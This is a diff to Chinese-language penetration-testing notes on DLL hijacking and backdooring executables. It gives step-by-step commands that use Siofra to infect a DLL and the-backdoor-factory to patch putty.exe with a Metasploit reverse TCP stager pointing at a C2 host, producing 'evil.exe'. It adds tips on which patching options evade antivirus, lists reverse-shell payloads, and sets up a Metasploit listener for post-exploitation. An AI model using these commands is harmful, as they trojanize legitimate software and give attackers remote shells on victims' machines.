@@ -7,7 +7,6 @@ DLL Hijacking
 
 ### 测试
 
-
 使用[siofra](https://github.com/Cybereason/siofra)检测xx.exe的DLL能否被劫持
 
 ```
@@ -24,10 +23,10 @@ Siofra32.exe --mode infect -f chrome_elf(real).dll -o chrome_elf.dll --payload-t
 
 Black Hat USA 2015 分享的工具 (kali2.0自带 虽然不再维护 但不影响使用)
 
-[secretsquirrel/the-backdoor-factory](https://github.com/secretsquirrel/the-backdoor-factory)
-
-功能：Patch PE, ELF, Mach-O binaries with shellcode
-
+* [secretsquirrel/the-backdoor-factory](https://github.com/secretsquirrel/the-backdoor-factory)
+  * 功能：Patch PE, ELF, Mach-O binaries with shellcode. 
+  * 原理：查找二进制程序的代码缝隙，并在其中插入自定义代码，生成新的二进制程序（文件大小不变。且理论上不影响原有功能，具体需要实际测试）
+  * 触发：运行修改后的二进制程序，会执行自定义代码
 
 #### 实际利用 - Windows下PE程序的Patch过程
 
@@ -41,16 +40,30 @@ backdoor-factory -f putty.exe -S
 # 2. 检测某文件 的代码缝隙(code cave)及大小   这里查看size>200的代码缝隙
 backdoor-factory -f putty.exe -c -l 200
 
-# 3. 检测某文件 具体支持插入 哪些payload(本工具自带的)
+# 3. 检测某文件 具体支持插入 哪些payload(工具自带8种payload. 选user_supplied_shellcode_threaded为指定自定义payload)
 backdoor-factory -f putty.exe -s show
 
+·cave_miner_inline
+·iat_reverse_tcp_inline
+·iat_reverse_tcp_inline_threaded
+·iat_reverse_tcp_stager_threaded #利用这个二进制程序的IAT(the Import Address Table)导入地址表，插入Metasploit reverse TCP stager的代码
+·iat_user_supplied_shellcode_threaded
+·meterpreter_reverse_https_threaded
+·reverse_shell_tcp_inline
+·reverse_tcp_stager_threaded
+·user_supplied_shellcode_threaded #自定义payload
 
-# 4. 插入指定payload(本工具自带的)
+
+# 4. 插入payload
 #    插入 本工具自带的某种具体的payload(这里是iat_reverse_tcp_stager_threaded)  -H指定C2服务器IP -P指定C2服务器端口
-#    以下方式可选
-#    (1)如果 使用-J参数:将shellcode保存到>1个代码缝隙 - 如果shellcode过大可以用这个方式 且具有更好的免杀效果
-#    (2)如果 不加-J参数:将shellcode保存到=1个代码缝隙 - 选择某1个可用的代码缝隙(code cave) 理论上选哪个都可以
-#    (3)如果 使用-a参数:将新section添加到exe中 - 更容易成功 但免杀效果差
+#    以下Patch方式可选(默认Patch方式为手动Patch.  使用参数 -m automatic 即可指定为自动Patch)
+#    [4-1] 手动Patch(backdoor-factory将提示你手动选择 代码缝隙的数量和大小)
+#        (1)如果 使用-J参数:将shellcode保存到>1个代码缝隙 - 如果shellcode过大可以用这个方式 且具有更好的免杀效果
+#        (2)如果 不加-J参数:将shellcode保存到=1个代码缝隙 - 选择某1个可用的代码缝隙(code cave) 理论上选哪个都可以
+#        (3)如果 使用-a参数:将新section添加到exe中 - 更容易成功 但免杀效果差   使用-a参数的同时常常使用 -n name 指定新的section的名字（长度必须小于7个字符）
+#    [4-2] 自动Patch(backdoor-factory将判断并自动选择 代码缝隙的数量和大小)
+#        backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.1.15.15 -P 4444 -o evil.exe -m automatic
+
 backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.1.15.15 -P 4444 -o evil.exe -J
 ```
 
@@ -62,6 +75,8 @@ set payload windows/meterpreter/reverse_tcp
 set lhost 10.1.15.15
 set lport 4444
 exploit
+
+# 收到shell后可以进行后渗透操作:迁移到其他进程(migrate to other processes), 权限提升(escalate privileges), 攻击内网中的其他主机...
 ```
 
 
